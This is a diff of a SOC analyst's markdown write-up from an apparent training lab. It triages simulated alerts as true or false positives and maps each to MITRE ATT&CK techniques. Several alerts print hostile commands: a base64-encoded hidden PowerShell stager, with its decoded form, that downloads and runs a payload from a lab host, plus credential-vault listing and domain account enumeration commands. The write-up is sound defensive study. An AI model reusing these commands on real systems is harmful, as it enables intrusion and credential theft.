@@ -117,27 +117,27 @@ Also, the path is completely wrong
 
 In this case we can assume that the attacker is trying to do an internal reconnaissance or enumeration.
 
-#### Verdict - 6355 (Anomalous Credential Vault Access)
+#### Verdict - 6355 (Anomalous Credential Vault Access)  
 
-Description: The malicious file `svchost_update.ps1` from Temp folder tried to steal credentials to obtain ways to do lateral movement.
-Timestamp: `10/23/2026 11:31:04.782`
-User: TRYHATME\m.smith
-Asset: THM-MSMITH.tryhatmestudios.thm
-List of IOCs: 
-- C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1
-- C:\Windows\Sysnative\vaultcmd.exe /listcreds:Windows Credentials
+Description: The malicious file `svchost_update.ps1` from Temp folder tried to steal credentials to obtain ways to do lateral movement.   
+Timestamp: `10/23/2026 11:31:04.782`    
+User: TRYHATME\m.smith   
+Asset: THM-MSMITH.tryhatmestudios.thm   
+List of IOCs:    
+- C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1   
+- C:\Windows\Sysnative\vaultcmd.exe /listcreds:Windows Credentials   
+  
+The following methods were identified:     
 
-The following methods were identified:
+**Masquerading** (`svchost.exe`)   
+- **Technique**: T1036    
+- **Sub-Technique**:T1036.005 (Match Legitimate Name or Location)   
 
-**Masquerading** (`svchost.exe`)
-- **Technique**: T1036 
-- **Sub-Technique**:T1036.005 (Match Legitimate Name or Location)
+**Execution via Command and Scripting Interpreter**   
+- **Technique**: T1059 (Command and Scripting Interpreter)   
+- **Sub-Technique**: T1059.001 (PowerShell)   
 
-**Execution via Command and Scripting Interpreter**
-- **Technique**: T1059 (Command and Scripting Interpreter)
-- **Sub-Technique**: T1059.001 (PowerShell)
-
-<Success>True Positive case. Escalation needed for further investigation. </Success>
+<Success>True Positive case. Escalation needed for further investigation. </Success>  
 
 ## Second Alert - 6360 (Suspicious External Connection Following Archive Creation)
 ![](../../assets/Pasted%20image%2020261022192358.png)
@@ -203,18 +203,18 @@ So no reason for the connection to be happening other than Exfiltration.
 
 #### Verdict - 6360 (Suspicious External Connection Following Archive Creation)
 
-Description: The attacker is trying to deliver data to the C2 Server via port 52624.
-Timestamp: `10/23/2026 11:46:30.782`
-User: NT AUTHORITY\SYSTEM
-Asset: THM-SREYES.tryhatmestudios.thm
-List of IOCs: 
-- 45[.]147[.]230[.]131[:]8067
-
-The following methods were identified:
-
-**Exfiltration Over Alternative Protocol**
-- ****Technique****: T1048 (Exfiltration Over Alternative Protocol)
-- ****Sub-****Technique****: T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)
+Description: The attacker is trying to deliver data to the C2 Server via port 52624.  
+Timestamp: `10/23/2026 11:46:30.782`  
+User: NT AUTHORITY\SYSTEM  
+Asset: THM-SREYES.tryhatmestudios.thm  
+List of IOCs:   
+- 45[.]147[.]230[.]131[:]8067  
+  
+The following methods were identified:  
+  
+**Exfiltration Over Alternative Protocol**  
+- **Technique**: T1048 (Exfiltration Over Alternative Protocol)  
+- **Sub-Technique**: T1048.003 (Exfiltration Over Unencrypted Non-C2 Protocol)  
 
 <Success>True Positive case. Escalation needed for further investigation. </Success>
 
@@ -272,10 +272,10 @@ Which matches the simulation internal structure:
 This checks the internal structure of the service. With no further need for investigation.
 #### Verdict - 6358 (Suspicious External Connection Following Archive Creation)
 
-Asset: THM-SREYES.tryhatmestudios.thm 
-User Context: NT AUTHORITY\SYSTEM
-Time: `10/23/2026 11:43:34.782`
-The IPs and Ports matches the internal working service of Game Development server hosting with CloudFlare. Overall, the verdict is:
+Asset: THM-SREYES.tryhatmestudios.thm   
+User Context: NT AUTHORITY\SYSTEM  
+Time: `10/23/2026 11:43:34.782`  
+The IPs and Ports matches the internal working service of Game Development server hosting with CloudFlare. Overall, the verdict is:  
 
 <Error> False Positive </Error>
 
@@ -317,30 +317,30 @@ Similar with the alert **#6355**, we can confidently identify the same behaviour
 
 #### Verdict - 6357 (Suspicious Remote Logon and Service Creation)
 
-Description:  The suspicious Temp file `svchost_update.ps1` is starting / modifying a service SvcUpdate.
-Timestamp: `10/23/2026 11:38:34.782`
-User: TRYHATME\svc-mktshare
-Asset: THM-SREYES.tryhatmestudios.thm
-List of IOCs: 
-- SvcUpdate
-- C:\Windows\Temp\svchost_update.ps1
+Description:  The suspicious Temp file `svchost_update.ps1` is starting / modifying a service SvcUpdate.  
+Timestamp: `10/23/2026 11:38:34.782`  
+User: TRYHATME\svc-mktshare  
+Asset: THM-SREYES.tryhatmestudios.thm  
+List of IOCs:   
+- SvcUpdate  
+- C:\Windows\Temp\svchost_update.ps1  
+  
+The following where identified:  
 
-The following where identified:
+**Masquerading** (SvcUpdate / svchost_update.ps1)  
+- **Technique**: T1036 (Masquerading)  
+- **Sub-Technique**: T1036.005 (Match Legitimate Name or Location)  
+  
+**Execution via Command and Scripting Interpreter** (Windows Command Shell)    
+- **Technique**: T1059 (Command and Scripting Interpreter)   
+- **Sub-Technique: T1059.003 (Windows Command Shell)   
 
-**Masquerading** (SvcUpdate / svchost_update.ps1)
-- ****Technique****: T1036 (Masquerading)
-- ****Sub-****Technique****: T1036.005 (Match Legitimate Name or Location)
+**Create or Modify System Process** (Windows Service)  
+- **Technique**: T1543 (Create or Modify System Process)  
+- **Sub-Technique**: T1543.003 (Windows Service)  
 
-**Execution via Command and Scripting Interpreter** (Windows Command Shell)
-- ****Technique****: T1059 (Command and Scripting Interpreter)
-- ****Sub-****Technique****: T1059.003 (Windows Command Shell)
-
-**Create or Modify System Process** (Windows Service)
-- ****Technique****: T1543 (Create or Modify System Process)
-- ****Sub-****Technique****: T1543.003 (Windows Service)
-
-<Success>True Positive case. Escalation needed for further investigation. </Success>
-## Fifth Alert - 6352 (Suspicious Child Process Spawned)
+<Success>True Positive case. Escalation needed for further investigation. </Success> 
+## Fifth Alert - 6352 (Suspicious Child Process Spawned)  
 ![](../../assets/Pasted%20image%2020261022195734.png)
 ![](../../assets/Pasted%20image%2020261022195743.png)
 > **Alert & Event Metadata**
@@ -414,11 +414,11 @@ But because the rest of the context is legitimate, we can assume the service is 
 
 #### Verdict - 6352 (Suspicious Child Process Spawned)
 
-Description: Standard Microsoft Ai service
-Asset: THM-MSMITH.tryhatmestudios.thm
-User: TRYHATME\m.smith
-Time: `10/23/2026 11:31:00.782`
-After the investigation we can confidently say that the alert is
+**Description**: Standard Microsoft Ai service  
+**Asset**: THM-MSMITH.tryhatmestudios.thm  
+**User**: TRYHATME\m.smith  
+**Time**: `10/23/2026 11:31:00.782`  
+After the investigation we can confidently say that the alert is  
 
 <Error> False Positive </Error>
 
@@ -470,7 +470,6 @@ After the investigation we can confidently say that the alert is
 We are given the following playbook.
 ![](../../assets/Pasted%20image%2020261023203604.png)
 
-
 The process is legitimate (`powershell.exe`) but worth noting just to make sure we follow the playbook. The real deal is hidden in the command line.
 
 **CommandLine**: `powershell.exe -NoP -W Hidden -Enc JABzAHQAYQBnAGUAcgAgAD0AIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAIgANAAoAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABpAG4AawAtAGMAZABuAC4AdABoAG0AOgA4ADAANgA3AC8AcwB2AGMAaABvAHMAdABfAHUAcABkAGEAdABlAC4AcABzADEAJwAsACAAJABzAHQAYQBnAGUAcgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAYAAiACQAcwB0AGEAZwBlAHIAYAAiACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==`
@@ -479,7 +478,7 @@ Similar as before, but this time we have another `-Enc` flag.
 `-Enc` flag is executing the base64 encoded script.
 The results of the decoding, is mentioned in the summary of the alert.
 
-**Decoded Command**: `$stager = "$env:TEMP\svchost_update.ps1"; (New-Object Net.WebClient).DownloadFile('http[:]//paylink-cdn[.]thm:8067/svchost_update.ps1', $stager); Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File "$stager" -WindowStyle Hidden"
+**Decoded Command** in CyberChief: `$stager = "$env:TEMP\svchost_update.ps1"; (New-Object Net.WebClient).DownloadFile('http[:]//paylink-cdn[.]thm:8067/svchost_update.ps1', $stager); Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File "$stager" -WindowStyle Hidden"
 
 So basically a script that downloads svchost_update.ps1 from the `http[:]//paylink-cdn[.]thm:8067` and hide it with Hidden flags. It will be saved in the TEMP file.
 
@@ -488,42 +487,42 @@ We understand what is actually executing and doing, of course it is obvious that
 
 #### Verdict - 6353 (Suspicious Child Process Spawned)
 
-Description:  The attacker is establishing an connection with paylink-cdn[.]thm:8067 to get the malicious file `svchost_update.ps1` to the host via encoding the script into the command line.
-Timestamp: `10/23/2026 11:31:00.782`
-User: M.Smith
-Asset: TRYHATME\m.smith
-List of IOCs: 
-- svchost_update.ps1
-- paylink-cdn[.]thm:8067
+**Description**:  The attacker is establishing an connection with paylink-cdn[.]thm:8067 to get the malicious file `svchost_update.ps1` to the host via encoding the script into the command line.
+Timestamp: `10/23/2026 11:31:00.782`  
+**User**: M.Smith  
+**Asset**: TRYHATME\m.smith  
+**List of IOC**s:   
+- svchost_update.ps1  
+- paylink-cdn[.]thm:8067  
+  
+The following techniques and tactics used:  
+  
+**User Execution (Malicious File)**  
+- **Technique**: T1204 (User Execution)  
+- **Sub-Technique**: T1204.002 (Malicious File)  
 
-The following techniques and tactics used:
+**Execution via Command and Scripting Interpreter**  
+- **Technique**: T1059 (Command and Scripting Interpreter)  
+- **Sub-Technique**: T1059.001 (PowerShell)  
 
-**User Execution (Malicious File)**
-- ****Technique****: T1204 (User Execution)
-- ****Sub-****Technique****: T1204.002 (Malicious File)
+**Execution via Office Macro / Scripting**  
+- **Technique**: T1059 (Command and Scripting Interpreter)  
+- **Sub-Technique**: T1059.005 (Visual Basic)  
 
-**Execution via Command and Scripting Interpreter**
-- ****Technique****: T1059 (Command and Scripting Interpreter)
-- ****Sub-****Technique****: T1059.001 (PowerShell)
+**Obfuscated Files or Information (Base64 Encoded Command)**  
+- **Technique**: T1027 (Obfuscated Files or Information)  
+- **Sub-Technique**: T1027.010 (Command Obfuscation)  
 
-**Execution via Office Macro / Scripting**
-- ****Technique****: T1059 (Command and Scripting Interpreter)
-- ****Sub-****Technique****: T1059.005 (Visual Basic)
+**Ingress Tool Transfer (Payload Download via WebClient)**  
+- **Technique**: T1105 (Ingress Tool Transfer)  
 
-**Obfuscated Files or Information (Base64 Encoded Command)**
-- ****Technique****: T1027 (Obfuscated Files or Information)
-- ****Sub-****Technique****: T1027.010 (Command Obfuscation)
+**Masquerading (svchost_update.ps1)**  
+- **Technique**: T1036 (Masquerading)  
+- **Sub-Technique**: T1036.005 (Match Legitimate Name or Location)  
 
-**Ingress Tool Transfer (Payload Download via WebClient)**
-- ****Technique****: T1105 (Ingress Tool Transfer)
-
-**Masquerading (svchost_update.ps1)**
-- ****Technique****: T1036 (Masquerading)
-- ****Sub-****Technique****: T1036.005 (Match Legitimate Name or Location)
-
-**Hide Artifacts (Hidden Window Execution)**
-- ****Technique****: T1564 (Hide Artifacts)
-- ****Sub-****Technique****: T1564.003 (Hidden Window)
+**Hide Artifacts (Hidden Window Execution)**  
+- **Technique**: T1564 (Hide Artifacts)  
+- **Sub-Technique**: T1564.003 (Hidden Window)  
 
 <Success>True Positive case. Escalation needed for further investigation. </Success>
 
@@ -571,29 +570,29 @@ The following techniques and tactics used:
 
 #### Overview Investigation
 
-We are provided with no playbook, which is important to mention due to the process steps.
+We are provided with no playbook, which is important to mention due to the process steps.  
 
-The file is named `net.exe`, is a native, built-in command-line utility in Microsoft Windows used to manage network resources, user accounts, groups, services, and shared drives.
+The file is named `net.exe`, is a native, built-in command-line utility in Microsoft Windows used to manage network resources, user accounts, groups, services, and shared drives.  
 
-Command line:
-`"C:\Windows\system32\net.exe" user /domain` could be normal, but it is really important who or what triggered the command.
+Command line:  
+`"C:\Windows\system32\net.exe" user /domain` could be normal, but it is really important who or what triggered the command.  
 
-Let's take a look at the **Parent CommandLine**: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -ExecutionPolicy Bypass -File "C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1"`
+Let's take a look at the **Parent CommandLine**:   `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -ExecutionPolicy Bypass -File "C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1"`
 
 The powershell executed with same flags as before, Hidden for no reason. We can already close the alert for a `True Positive` case. Also, svchost_update.ps1 appears again in the fourth alert. So in the end, the user /domain is done for the user enumartion tactic.
 
 
 #### Verdict - 6356 (Rapid Domain and Host Enumeration from Non-Administrative Host)
 
-Description:  The filed `svchost_update.ps1` moved into the MC0CD~1.SMI user and it is trying to enumerate credentials via `"C:\Windows\system32\net.exe" user /domain`.
-Timestamp: `10/23/2026 11:36:04.782`
-User: TRYHATME\m.smith
-Asset: THM-MSMITH.tryhatmestudios.thm
-List of IOCs: 
-- C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1
-
-After the investigation we can list the following Techniques:
-
+Description:  The filed `svchost_update.ps1` moved into the MC0CD~1.SMI user and it is trying to enumerate credentials via `"C:\Windows\system32\net.exe" user /domain`.  
+Timestamp: `10/23/2026 11:36:04.782`   
+User: TRYHATME\m.smith    
+Asset: THM-MSMITH.tryhatmestudios.thm    
+List of IOCs:   
+- C:\Users\MC0CD~1.SMI\AppData\Local\Temp\svchost_update.ps1  
+  
+After the investigation we can list the following Techniques:  
+  
 **Account Discovery** (Domain Account Enumeration)
 - **Technique**: T1087 (Account Discovery)
 - **Sub-Technique**: T1087.002 (Domain Account)
@@ -612,7 +611,7 @@ After the investigation we can list the following Techniques:
 
 <Success>True Positive case. Escalation needed for further investigation. </Success>
 
-## Eighth Alert - 6359 (Suspicious Archive Utility Execution on Workstation)
+## Eighth Alert - 6359 (Suspicious Archive Utility Execution on Workstation)  
 
 ![](../../assets/Pasted%20image%2020261022201455.png)
 ![](../../assets/Pasted%20image%2020261022201504.png)
@@ -669,12 +668,12 @@ Hidden powershell and bypassing rules is the obvious giveaway here.
 
 #### Verdict - 6359 (Suspicious Archive Utility Execution on Workstation)
 
-Description: The archived game build located in the Windows\Temp  named `nx_build_beta.7z` is getting ready to be exfiltrated via the C2 command server based on the other alerts.
-Timestamp: `10/23/2026 11:45:25.782`
-User: NT AUTHORITY\SYSTEM
-Asset: THM-SREYES.tryhatmestudios.thm
-List of IOCs: 
-- C:\Windows\Temp\nx_build_beta.7z
+**Description**: The archived game build located in the Windows\Temp  named `nx_build_beta.7z` is getting ready to be exfiltrated via the C2 command server based on the other alerts.  
+**Timestamp**: `10/23/2026 11:45:25.782`   
+**User**: NT AUTHORITY\SYSTEM   
+**Asset**: THM-SREYES.tryhatmestudios.thm  
+**List of IOCs**:   
+- C:\Windows\Temp\nx_build_beta.7z  
 
 After the investigation we can list the following Techniques:
 
@@ -738,12 +737,12 @@ We can see 37 events just by that suspicious connection.
 
 #### Verdict - 6354 (Suspicious Outbound Connection Following Document Execution)
 
-Description: PowerShell initiated an outbound callback to external C2 infrastructure (45[.]147[.]230[.]131[:]8067) to download the secondary payload (svchost_update.ps1) following macro execution.
-Timestamp: `10/23/2026 11:31:03.782`
-User: TRYHATME\m.smith
-Asset: THM-MSMITH.tryhatmestudios.thm
-List of IOCs: 
-- 45[.]147[.]230[.]131[:]8067
+**Description**: PowerShell initiated an outbound callback to external C2 infrastructure (45[.]147[.]230[.]131[:]8067) to download the secondary payload (svchost_update.ps1) following macro execution.  
+**Timestamp**: `10/23/2026 11:31:03.782`  
+**User**: TRYHATME\m.smith  
+**Asset**: THM-MSMITH.tryhatmestudios.thm  
+**List of IOCs**:   
+- 45[.]147[.]230[.]131[:]8067  
 
 The following methods were discovered:
 
